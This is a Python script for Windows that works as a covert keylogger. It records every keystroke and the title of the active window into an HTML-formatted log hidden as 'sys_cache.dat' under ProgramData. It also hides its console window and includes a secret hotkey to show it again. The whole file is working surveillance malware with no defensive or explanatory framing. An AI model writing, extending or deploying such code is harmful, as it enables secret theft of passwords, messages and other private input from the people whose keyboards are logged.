import os
import json
import logging
import threading
import pynput.keyboard as keyboard
import psutil
import time
import random
from datetime import datetime
from pynput import keyboard
import win32console
import win32gui

# Hidden file path
BASE_DIR = "C:\\ProgramData\\SystemLogs"
os.makedirs(BASE_DIR, exist_ok=True)
log_path = os.path.join(BASE_DIR, "sys_cache.dat")

# Ensure proper date formatting
current_date = datetime.now().strftime("%Y-%m-%d")

# Create log file if it doesn't exist, else append
if not os.path.exists(log_path):
    with open(log_path, "w") as file:
        file.write(f"""
        <html>
        <head>
            <title>Activity Log</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
                body {{ font-family: 'Poppins', sans-serif; background-color: #121212; color: #ffffff; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }}
                .container {{ width: 90%; max-width: 800px; background: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3); animation: fadeIn 0.5s ease-in-out; }}
                @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(-10px); }} to {{ opacity: 1; transform: translateY(0); }} }}
                h2 {{ text-align: center; font-weight: 600; margin-bottom: 20px; }}
                .header {{ text-align: right; font-size: 18px; font-weight: bold; color: #00bcd4; }}
                .entry {{ background: #252525; padding: 10px; border-radius: 6px; margin-bottom: 10px; animation: fadeIn 0.5s ease-in-out; }}
                .timestamp {{ font-size: 14px; font-weight: bold; color: #ff9800; }}
                .app {{ font-size: 16px; font-weight: bold; color: #4caf50; }}
                .key {{ font-size: 14px; font-style: italic; color: #d1d1d1; }}
            </style>
        </head>
        <body>
        <div class='header'>Date: {current_date}</div>
        <div class='container'>
        <h2>Activity Log</h2>
        """)

def get_active_window():
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except ImportError:
        return "Unknown"

logging_enabled = True

def log_keystroke(key):
    global logging_enabled
    if not logging_enabled:
        return
    
    try:
        key = key.char if hasattr(key, 'char') and key.char is not None else str(key)
    except AttributeError:
        key = str(key)
    
    active_window = get_active_window()
    timestamp = datetime.now().strftime("%H:%M:%S")

    with open(log_path, "a") as file:
        file.write(f"""
        <div class='entry'>
            <div class='timestamp'>{timestamp}</div>
            <div class='app'>{active_window}</div>
            <div class='key'>{key}</div>
        </div>
        """)

def start_logging():
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

def hide_console():
    try:
        window = win32console.GetConsoleWindow()
        if window:
            win32gui.ShowWindow(window, 0)  # Hide console
    except ImportError:
        pass

def command_listener():
    global logging_enabled
    while True:
        command = input("Enter command: ")
        if command.lower() == "stop":
            logging_enabled = False
            print("Logging stopped.")
        elif command.lower() == "start":
            logging_enabled = True
            print("Logging started.")

def toggle_console():
    try:
        window = win32console.GetConsoleWindow()
        if win32gui.IsWindowVisible(window):
            win32gui.ShowWindow(window, 0)  # Hide console
        else:
            win32gui.ShowWindow(window, 1)  # Show console
    except:
        pass

hide_console()

t = threading.Thread(target=start_logging, daemon=True)
t.start()

cmd_thread = threading.Thread(target=command_listener, daemon=True)
cmd_thread.start()

with keyboard.GlobalHotKeys({"<ctrl>+<shift>+o": toggle_console}):
    while True:
        time.sleep(10)
